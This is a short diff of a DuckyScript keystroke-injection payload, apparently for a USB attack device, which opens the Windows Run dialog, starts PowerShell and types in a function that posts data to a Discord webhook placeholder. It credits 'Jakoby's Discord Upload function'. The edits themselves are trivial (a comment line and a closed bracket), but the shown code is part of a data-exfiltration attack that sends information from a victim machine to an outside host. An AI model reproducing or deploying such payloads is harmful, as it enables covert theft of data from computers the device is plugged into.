@@ -15,7 +15,7 @@ REM # References: Jakoby's Discord Upload function		#
 REM # 	https://github.com/I-Am-Jakoby/				#
 REM # 								#
 REM #############################################################
-
+REM 
 GUI r
 DELAY 1000
 STRING powershell
@@ -37,7 +37,7 @@ STRING    [string]$text
 ENTER
 STRING )
 ENTER
-STRING $hookurl = '<DISCORD_WEB_HOOK'
+STRING $hookurl = '<DISCORD_WEB_HOOK>'
 ENTER
 STRING $Body = @{
 ENTER
